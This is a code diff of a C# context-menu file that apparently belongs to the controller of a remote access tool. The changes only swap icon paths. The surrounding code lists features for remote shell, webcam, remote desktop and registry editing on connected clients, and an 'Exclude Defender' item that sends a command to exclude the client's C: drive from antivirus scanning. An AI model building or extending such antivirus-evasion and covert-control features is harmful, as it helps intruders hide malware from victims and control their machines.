@@ -30,10 +30,10 @@ internal static class FeatureContextMenu
             mainWindow.OpenFeatureWindow<RemoteShellWindow>(clientId, () => new RemoteShellWindow(server, clients));
         }));
         admin.Items.Add(MakeItem(Lang.Get("FEAT_FILE_MANAGER"),    "SvgImages/Icon Builder/Actions_FolderOpen.svg",     () => mainWindow.OpenFeatureWindow<FileManagerWindow>(clientId,      () => new FileManagerWindow(server, clientId, clientId))));
-        admin.Items.Add(MakeItem(Lang.Get("FEAT_PROCESS_MGR"),     "SvgImages/Business Objects/BO_Dashboard.svg",  () => mainWindow.OpenFeatureWindow<ProcessManagerWindow>(clientId,   () => new ProcessManagerWindow(server, clientId, clientId))));
+        admin.Items.Add(MakeItem(Lang.Get("FEAT_PROCESS_MGR"),     "processmanager.png",                           () => mainWindow.OpenFeatureWindow<ProcessManagerWindow>(clientId,   () => new ProcessManagerWindow(server, clientId, clientId))));
         admin.Items.Add(MakeItem(Lang.Get("FEAT_STARTUP_MGR"),     "SvgImages/Icon Builder/Actions_Clock.svg",          () => mainWindow.OpenFeatureWindow<StartupManagerWindow>(clientId,   () => new StartupManagerWindow(server, clientId, clientId))));
         admin.Items.Add(MakeItem(Lang.Get("FEAT_TCP_CONN"),        "SvgImages/Icon Builder/Electronics_Router.svg",     () => mainWindow.OpenFeatureWindow<TcpManagerWindow>(clientId,       () => new TcpManagerWindow(server, clientId, clientId))));
-        admin.Items.Add(MakeItem(Lang.Get("FEAT_SERVICE_MGR"),     "SvgImages/Icon Builder/Actions_BlockContact.svg",   () => mainWindow.OpenFeatureWindow<ServiceManagerWindow>(clientId,   () => new ServiceManagerWindow(server, clientId, clientId))));
+        admin.Items.Add(MakeItem(Lang.Get("FEAT_SERVICE_MGR"),     "Resources/Icons/services.svg",                      () => mainWindow.OpenFeatureWindow<ServiceManagerWindow>(clientId,   () => new ServiceManagerWindow(server, clientId, clientId))));
         admin.Items.Add(MakeItem(Lang.Get("FEAT_WINDOW_MGR"),      "SvgImages/Icon Builder/Actions_Window.svg",         () => mainWindow.OpenFeatureWindow<WindowManagerWindow>(clientId,    () => new WindowManagerWindow(server, clientId, clientId))));
         admin.Items.Add(MakeItem(Lang.Get("FEAT_REGISTRY_EDITOR"), "registry.png",      () => mainWindow.OpenFeatureWindow<RegistryEditorWindow>(clientId,  () => new RegistryEditorWindow(server, clientId, clientId))));
         admin.Items.Add(MakeItem(Lang.Get("FEAT_INSTALLED_APPS"),  "SvgImages/Icon Builder/Shopping_Box.svg",           () => mainWindow.OpenFeatureWindow<InstalledAppsWindow>(clientId,   () => new InstalledAppsWindow(server, clientId, clientId))));
@@ -65,7 +65,7 @@ internal static class FeatureContextMenu
         menu.Items.Add(admin);
 
         // ── Monitoring ──────────────────────────────────────────────────
-        var monitoring = MakeParent(Lang.Get("FEAT_GRP_MONITORING"), "SvgImages/Chart/ChartType_SwiftPlot.svg");
+        var monitoring = MakeParent(Lang.Get("FEAT_GRP_MONITORING"), "SvgImages/Icon Builder/Security_Visibility.svg");
         if (excludeWindowType != "RemoteDesktopWindow")
             monitoring.Items.Add(MakeItem(Lang.Get("FEAT_REMOTE_DESKTOP"), "rdp.png", () => mainWindow.OpenFeatureWindow<RemoteDesktopWindow>(clientId,      () => new RemoteDesktopWindow(server, clientId))));
         if (excludeWindowType != "WebcamWindow")
@@ -80,7 +80,7 @@ internal static class FeatureContextMenu
 
         // ── Miscellaneous ───────────────────────────────────────────────
         var misc = MakeParent(Lang.Get("FEAT_GRP_MISC"), "SvgImages/Icon Builder/Actions_Options.svg");
-        misc.Items.Add(MakeItem(Lang.Get("FEAT_EXCLUDE_DEFENDER"), "SvgImages/Icon Builder/Security_SecurityShield.svg", () =>
+        misc.Items.Add(MakeItem(Lang.Get("FEAT_EXCLUDE_DEFENDER"), "defender.png", () =>
         {
             _ = server.SendToClient(clientId, new Packet { Type = PacketType.DefenderExclude, Data = "{}" });
             ServerWindow.ReportGlobalActivity("Exclude C:\\", clientId, "complete");
